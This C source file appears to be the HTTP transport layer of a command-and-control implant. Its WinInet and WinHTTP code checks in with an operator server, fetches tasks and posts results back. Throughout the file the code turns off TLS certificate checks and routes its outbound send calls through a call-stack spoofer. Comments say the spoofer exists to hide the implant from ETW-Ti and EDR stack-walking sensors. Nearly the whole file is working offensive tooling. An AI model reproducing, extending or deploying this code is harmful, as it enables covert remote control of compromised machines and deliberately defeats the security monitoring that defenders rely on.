#include "config.h"
#ifdef HTTP_TRANSPORT

#include "common.h"
#include "transport_http.h"

// LACUNA synthetic-stack dispatch: egress calls route through the spoofer
// (pivot primitive handles >4 args and wininet's shadow-home spills) when
// compiled in, plain direct calls otherwise.
#if defined(INCLUDE_EVASION_CALLSTACK_SPOOF) && defined(_WIN64)
#include "evasion/callstack_spoof.h"
#define ES_SPOOFED(inst, fn, n, ...) \
    callstack_spoofed_call((inst), (PVOID)(fn), (n), ##__VA_ARGS__)
#else
#define ghost_chain_plant(inst)      ((void)0)
#define ghost_chain_restore(inst)    ((void)0)
#define ES_SPOOFED(inst, fn, n, ...) ((PVOID)(UINT64)(fn)(__VA_ARGS__))
#endif

#ifdef USE_WININET

// ── WinInet transport ──────────────────────────────────────────────────────────

// Session/connect handles are opened ONCE and reused for the process lifetime.
// Opening a fresh session per request re-runs WinInet's preconfig (WPAD/DHCP)
// proxy resolution every cycle - measured 19s+ stalls per request on the T2
// VM (dump-verified freeze inside wininet on the second tasking cycle). The
// handles are dropped on any request failure so the next cycle re-establishes.
static PVOID g_http_session = NULL;
static PVOID g_http_connect = NULL;

static void http_drop_handles(PINSTANCE inst) {
    if (g_http_connect) { inst->Win32.InternetCloseHandle(g_http_connect); g_http_connect = NULL; }
    if (g_http_session) { inst->Win32.InternetCloseHandle(g_http_session); g_http_session = NULL; }
}

#define INTERNET_SERVICE_HTTP       3
#define INTERNET_FLAG_SECURE        0x00800000
#define INTERNET_FLAG_RELOAD        0x80000000
#define INTERNET_FLAG_NO_CACHE_WRITE 0x04000000
#define INTERNET_FLAG_KEEP_CONNECTION 0x00400000
#define INTERNET_OPTION_SECURITY_FLAGS 31
#define SECURITY_FLAG_IGNORE_ALL    0x00003380

static BOOL _http_request(PINSTANCE inst, LPCSTR verb, LPCSTR path,
                          BYTE* body, DWORD body_len,
                          BYTE** response, DWORD* resp_len) {
    if (!inst->Win32.InternetOpenA) { TRACE(inst, "http: InternetOpenA unresolved"); return FALSE; }

    if (!g_http_session) {
        TRACE(inst, "http: InternetOpenA calling");
        g_http_session = inst->Win32.InternetOpenA(
            inst->Http.user_agent, 0, NULL, NULL, 0);
        if (!g_http_session) { TRACE(inst, "http: InternetOpen failed"); return FALSE; }
    }
    if (!g_http_connect) {
        TRACE(inst, "http: InternetConnect calling");
        g_http_connect = inst->Win32.InternetConnectA(
            g_http_session, inst->Http.host, (WORD)inst->Http.port,
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!g_http_connect) {
            TRACE(inst, "http: InternetConnect failed");
            http_drop_handles(inst);
            return FALSE;
        }
    }
    TRACE(inst, "http: HttpOpenRequest calling");

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    if (inst->Http.use_ssl)
        flags |= INTERNET_FLAG_SECURE;

    HINTERNET hRequest = inst->Win32.HttpOpenRequestA(
        g_http_connect, verb, path, NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        http_drop_handles(inst);
        return FALSE;
    }

    // Receive timeout on the request handle: a stale pooled connection can
    // otherwise block InternetReadFile indefinitely (same failure shape as
    // the WinHttp path - infinite event wait instead of an error).
    {
        DWORD recv_timeout = 60000;   // 60s
        inst->Win32.InternetSetOptionA(hRequest, 14 /*INTERNET_OPTION_RECEIVE_TIMEOUT*/,
                                       &recv_timeout, sizeof(recv_timeout));
    }

    if (inst->Http.use_ssl) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_ALL;
        inst->Win32.InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                                       &sec_flags, sizeof(sec_flags));
    }

    // HttpSendRequestA blocks for the whole egress wait - the exact moment
    // ETW-Ti/stack sensors snapshot the thread. Route it through the
    // synthetic stack so every walked frame below wininet is a signed-
    // module ghost, not a raw blob address. Args pass raw: the dispatcher's
    // varargs read full slots and the callee consumes each at its declared
    // width (same convention as HH_SYSCALL).
    BOOL sent = (BOOL)(UINT_PTR)(UINT64)ES_SPOOFED(
        inst, inst->Win32.HttpSendRequestA, 5,
        hRequest, NULL, 0, body, body_len);
    if (!sent) {
        TRACE(inst, "http: HttpSendRequest failed");
        inst->Win32.InternetCloseHandle(hRequest);
        http_drop_handles(inst);
        return FALSE;
    }
    TRACE(inst, "http: HttpSendRequest ok, reading");

    DWORD total_size = 0;
    BYTE* total_buf = NULL;
    BYTE  tmp[4096];
    DWORD read = 0;

    while (inst->Win32.InternetReadFile(hRequest, tmp, sizeof(tmp), &read) && read > 0) {
        BYTE* new_buf = (BYTE*)es_realloc(inst, total_buf, total_size + read);
        if (!new_buf) {
            // realloc failed - free old buf and return error
            if (total_buf) es_free(inst, total_buf);
            inst->Win32.InternetCloseHandle(hRequest);
            http_drop_handles(inst);
            if (response) *response = NULL;
            if (resp_len) *resp_len = 0;
            return FALSE;
        }
        total_buf = new_buf;
        es_memcpy(total_buf + total_size, tmp, read);
        total_size += read;
        read = 0;
    }

    // keep session + connect cached; only the request handle is per-call
    inst->Win32.InternetCloseHandle(hRequest);

    if (response) *response = total_buf;
    if (resp_len) *resp_len = total_size;
    return TRUE;
}

static void build_path(const char* uri, char* out, int out_size) {
    int offset = 0;
    if (uri[0] != '/') {
        out[0] = '/';
        offset = 1;
    }
    for (int i = 0; uri[i] && (offset + i) < out_size - 1; i++)
        out[offset + i] = uri[i];
}

BOOL http_checkin(PINSTANCE inst) {
    char path[256] = {0};
    build_path(inst->Http.get_uri, path, 256);
    return _http_request(inst, "GET", path, NULL, 0, NULL, NULL);
}

BOOL http_get_tasks(PINSTANCE inst, BYTE** tasks, DWORD* tasks_len) {
    char path[256] = {0};
    build_path(inst->Http.get_uri, path, 256);
    return _http_request(inst, "GET", path, NULL, 0, tasks, tasks_len);
}

BOOL http_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                        BYTE** response, DWORD* resp_len) {
    char path[256] = {0};
    build_path(inst->Http.post_uri, path, 256);
    return _http_request(inst, "POST", path, data, data_len, response, resp_len);
}

#else // USE_WINHTTP

// ── WinHTTP transport ──────────────────────────────────────────────────────────

#include <winhttp.h>

// Session/connect opened once, reused for the process lifetime (see the
// WinInet path comment - per-request session setup re-runs proxy resolution
// and showed multi-second stalls on the T2 VM). Dropped on any failure.
static HINTERNET g_wh_session = NULL;
static HINTERNET g_wh_connect = NULL;

static void wh_drop_handles(PINSTANCE inst) {
    if (g_wh_connect) { inst->Win32.WinHttpCloseHandle(g_wh_connect); g_wh_connect = NULL; }
    if (g_wh_session) { inst->Win32.WinHttpCloseHandle(g_wh_session); g_wh_session = NULL; }
}

static BOOL _http_request(PINSTANCE inst, LPCWSTR verb, LPCWSTR path,
                          BYTE* body, DWORD body_len,
                          BYTE** response, DWORD* resp_len) {
    if (!inst->Win32.WinHttpOpen) return FALSE;

    wchar_t whost[256] = {0};
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, inst->Http.host, -1, whost, 256);

    wchar_t wua[256] = {0};
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, inst->Http.user_agent, -1, wua, 256);

    if (!g_wh_session) {
        g_wh_session = inst->Win32.WinHttpOpen(
            wua, 0 /*WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*/, NULL, NULL, 0);
        if (!g_wh_session) return FALSE;
    }
    if (!g_wh_connect) {
        g_wh_connect = inst->Win32.WinHttpConnect(
            g_wh_session, whost, (WORD)inst->Http.port, 0);
        if (!g_wh_connect) {
            wh_drop_handles(inst);
            return FALSE;
        }
    }

    DWORD flags = inst->Http.use_ssl ? 0x00800000 /*WINHTTP_FLAG_SECURE*/ : 0;
    HINTERNET hRequest = inst->Win32.WinHttpOpenRequest(
        g_wh_connect, verb, path, NULL, NULL, NULL, flags);
    if (!hRequest) {
        wh_drop_handles(inst);
        return FALSE;
    }

    // Per-request timeouts (ms): resolve, connect, send, receive. Without
    // these a stale pooled connection leaves WinHttpReceiveResponse waiting
    // INDEFINITELY on an internal event that never signals (dump-verified:
    // es_p8 live dump, main thread ZwWaitForSingleObject timeout=0 on event
    // handle 0x34) - the beacon hangs forever instead of erroring and
    // retrying on a fresh connection. WINHTTP_OPTION_RECEIVE_TIMEOUT etc.
    // are per-option; the four values here mirror WinHttpSetTimeouts.
    if (inst->Win32.WinHttpSetOption) {
        DWORD timeouts[4] = { 15000, 15000, 30000, 60000 };
        inst->Win32.WinHttpSetOption(hRequest, 6 /*WINHTTP_OPTION_RESOLVE_TIMEOUT*/, &timeouts[0], sizeof(DWORD));
        inst->Win32.WinHttpSetOption(hRequest, 7 /*WINHTTP_OPTION_CONNECT_TIMEOUT*/, &timeouts[1], sizeof(DWORD));
        inst->Win32.WinHttpSetOption(hRequest, 8 /*WINHTTP_OPTION_SEND_TIMEOUT*/, &timeouts[2], sizeof(DWORD));
        inst->Win32.WinHttpSetOption(hRequest, 9 /*WINHTTP_OPTION_RECEIVE_TIMEOUT*/, &timeouts[3], sizeof(DWORD));
    }

    if (inst->Http.use_ssl) {
        DWORD sec_flags = 0x00003300;
        inst->Win32.WinHttpSetOption(hRequest, 31,
                                     &sec_flags, sizeof(sec_flags));
    }

    // Egress send on the synthetic stack (see the HttpSendRequestA site)
    BOOL sent = (BOOL)(UINT_PTR)(UINT64)ES_SPOOFED(
        inst, inst->Win32.WinHttpSendRequest, 7,
        hRequest, NULL, 0, body, body_len, body_len, 0);
    if (!sent) {
        inst->Win32.WinHttpCloseHandle(hRequest);
        wh_drop_handles(inst);
        return FALSE;
    }

    if (!inst->Win32.WinHttpReceiveResponse(hRequest, NULL)) {
        inst->Win32.WinHttpCloseHandle(hRequest);
        wh_drop_handles(inst);
        return FALSE;
    }

    DWORD total_size = 0;
    BYTE* total_buf = NULL;
    DWORD avail = 0;

    while (inst->Win32.WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        BYTE* new_buf = (BYTE*)es_realloc(inst, total_buf, total_size + avail);
        if (!new_buf) break;
        total_buf = new_buf;

        DWORD read = 0;
        inst->Win32.WinHttpReadData(hRequest, total_buf + total_size, avail, &read);
        total_size += read;
    }

    // keep session + connect cached; only the request handle is per-call
    inst->Win32.WinHttpCloseHandle(hRequest);

    if (response) *response = total_buf;
    if (resp_len) *resp_len = total_size;
    return TRUE;
}

static void build_path(PINSTANCE inst, const char* uri, wchar_t* wpath, int wpath_size) {
    char path[256] = {0};
    int offset = 0;
    if (uri[0] != '/') {
        path[0] = '/';
        offset = 1;
    }
    for (int i = 0; uri[i] && (offset + i) < 254; i++)
        path[offset + i] = uri[i];
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, wpath_size);
}

BOOL http_checkin(PINSTANCE inst) {
    wchar_t wpath[256] = {0};
    build_path(inst, inst->Http.get_uri, wpath, 256);
    return _http_request(inst, XWSTR(L"GET"), wpath, NULL, 0, NULL, NULL);
}

BOOL http_get_tasks(PINSTANCE inst, BYTE** tasks, DWORD* tasks_len) {
    wchar_t wpath[256] = {0};
    build_path(inst, inst->Http.get_uri, wpath, 256);
    return _http_request(inst, XWSTR(L"GET"), wpath, NULL, 0, tasks, tasks_len);
}

BOOL http_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                        BYTE** response, DWORD* resp_len) {
    wchar_t wpath[256] = {0};
    build_path(inst, inst->Http.post_uri, wpath, 256);
    return _http_request(inst, XWSTR(L"POST"), wpath, data, data_len, response, resp_len);
}

#endif // USE_WININET / USE_WINHTTP

#endif // HTTP_TRANSPORT
